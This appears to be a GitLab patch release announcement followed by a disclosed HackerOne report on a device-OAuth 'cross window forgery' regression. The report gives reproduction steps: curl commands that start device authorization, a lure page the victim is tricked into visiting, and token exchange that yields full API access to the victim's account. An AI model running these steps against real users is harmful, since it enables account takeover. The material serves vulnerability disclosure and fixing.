# GitLab Patch Release: 17.5.2, 17.4.4, 17.3.7

Learn more about GitLab Patch Release: 17.5.2, 17.4.4, 17.3.7 for GitLab Community Edition (CE) and Enterprise Edition (EE).

Today we are releasing versions 17.5.2, 17.4.4, 17.3.7 for GitLab Community Edition (CE) and Enterprise Edition (EE).

These versions contain important bug and security fixes, and we strongly recommend that all self-managed GitLab installations be upgraded to
one of these versions immediately. GitLab.com is already running the patched version. GitLab Dedicated customers do not need to take action.

GitLab releases fixes for vulnerabilities in patch releases. There are two types of patch releases:
scheduled releases, and ad-hoc critical patches for high-severity vulnerabilities. Scheduled releases are released twice a month on the second and fourth Wednesdays.
For more information, you can visit our [releases handbook](https://handbook.gitlab.com/handbook/engineering/releases/) and [security FAQ](https://about.gitlab.com/security/faq/).
You can see all of GitLab release blog posts [here](/releases/categories/releases/).

For security fixes, the issues detailing each vulnerability are made public on our
[issue tracker](https://gitlab.com/gitlab-org/gitlab/-/issues/?sort=created_date&state=closed&label_name%5B%5D=bug%3A%3Avulnerability&confidential=no&first_page_size=100)
30 days after the release in which they were patched.

We are committed to ensuring all aspects of GitLab that are exposed to customers or that host customer data are held to
the highest security standards. As part of maintaining good security hygiene, it is highly recommended that all customers
upgrade to the latest patch release for their supported version. You can read more
[best practices in securing your GitLab instance](/blog/2020/05/20/gitlab-instance-security-best-practices/) in our blog post.

### Recommended Action

We **strongly recommend** that all installations running a version affected by the issues described below are **upgraded to the latest version as soon as possible**.

When no specific deployment type (omnibus, source code, helm chart, etc.) of a product is mentioned, this means all types are affected.

# Device OAuth flow allows for "cross window forgery" due to ID on accept button, leading to full API access as victim (regression)

‚ö†Ô∏è **Please read [the process](https://gitlab.com/gitlab-org/release/docs/-/blob/master/general/security/developer.md) on how to fix security issues before starting to work on the issue. Vulnerabilities must be fixed in a security mirror.**

**[HackerOne report #2627925](https://hackerone.com/reports/2627925)** by `joaxcar` on 2024-07-28, assigned to `GitLab Team`:

[Report](#report) | [Attachments](#attachments) | [How To Reproduce](#how-to-reproduce)

## Report

#### Summary

An attacker can gain full access to a victim account through `cross window forgery` [link](https://www.paulosyibelo.com/2024/02/cross-window-forgery-web-attack-vector.html)

I previously reported a similar issue in #2383443 that was solved as CVE-2024-2177 in version 17.1.1. See the private issue here [#444467 (closed)](https://gitlab.com/gitlab-org/gitlab/-/issues/444467 "User Application OAuth flow allows for \"cross window forgery\" due to ID on accept button, leading to full API access as victim")

The fix for #2383443 included removing the `id` attribute from the `authorize` button on the permission screen. However, the new `device authorization flow` introduced in 17.2 re-introduced the same issue with `id`s on the auth buttons.

You can go to <https://gitlab.com/oauth/device> and inspect the button, it will look like this

```
<button id="commit-changes" testid="authorization-button" type="submit" class="gl-button btn btn-md btn-confirm "><span class="gl-button-text">
Authorize
</span>
</button>
```

note the `id` of `commit-changes`. This first page only accepts the device token, but if you enter any random token into the field and move authorize this page you will see that even the next page on <https://gitlab.com/oauth/device/confirm> (needs to be visited from the first page form submit) the button there also has the same `id`

This new flow makes my old POC's functional again with some minor alterations.

I will show this using my `captcha` POC from earlier, but an attack can also be done using a simple game or any other way to trick users into performing the user interaction. See #2383443 for more examples.

#### Steps to reproduce

1. Create two accounts, `attacker` and `victim`
2. Log in as `attacker` and go to <https://gitlab.com/-/user_settings/applications>
3. Create a new `application`. Name it anything and fill out the form with anything, just make sure `confidential` is **not checked**
4. Save it and take a note of the `application` ID
5. Log out and log in as the `victim`
6. Start a terminal and run this command (replace `<APPLICATION ID>`)

```
CLIENT_ID="<APPLICATION ID>"
curl -X POST https://gitlab.com/oauth/authorize_device -d 'client_id=$CLIENT_ID&scope=email&scope=api' -H "content-type: application/x-www-form-urlencoded"
```

7. The response should look like this

```
{"device_code":"code","user_code":"code","verification_uri":"https://gitlab.com/oauth/device","verification_uri_complete":"https://gitlab.com/oauth/device?user_code=code","expires_in":300,"interval":5}
```

take a note of the `device_code` and the `user_code`

8. As the victim now visit this page `https://joaxcar.com/gitlab/click_attack_1.html?code=<USER_CODE>` (replace `<USER_CODE>`)
9. On the page follow the instructions to prove you are a human (holding down enter for approximately 3 seconds
10. Now back in the terminal run this command (replace `<DEVICE_CODE>` with device code from step 7 and `<APPLICATION_ID>` from step 4

```
DEVICE_CODE="<DEVICE_CODE>"
CLIENT_ID="<APPLICATION ID>"
curl -X POST \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d "client_id=$CLIENT_ID&grant_type=urn:ietf:params:oauth:grant-type:device_code&device_code=$DEVICE_CODE" \
    https://gitlab.com/oauth/token
```

This should give you a response like this

```
{"access_token":"token","token_type":"Bearer","expires_in":7200,"refresh_token":"token","scope":"api","created_at":1722151585}
```

This token will now give the attacker full access to the victim. Test it with this command

```
TOKEN="<access_token>"
curl --header "AUTHORIZATION: Bearer $TOKEN" "https://gitlab.com/api/v4/user"
```

11. As the victim go to <https://gitlab.com/-/user_settings/applications> and see that you have a new application with `api` access on your account

here is the POC page if you want to self host REDACTED

#### Impact

The attacker gains full access to the victim's account through API (read and write)

I put the CVSS to the same as the previous report as the impact is the same

#### What is the current *bug* behavior?

The Authorize button has an ID and can thus be the target of a fragment identifier. This allows for the "cross window forgery" attack

#### What is the expected *correct* behavior?

Removing the ID from the button will stop the attack

#### Relevant logs and/or screenshots

REDACTED

#### Output of checks

This bug happens on GitLab.com

#### Impact

The attacker gains full access to the victim's account through API (read and write)

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

REDACTED

## Solution proposal

In addition to removing the ID attribute, we should add specs for the OAuth flow such that the consent forms don't get ID attributes added again in future, to avoid more regressions.

## How To Reproduce
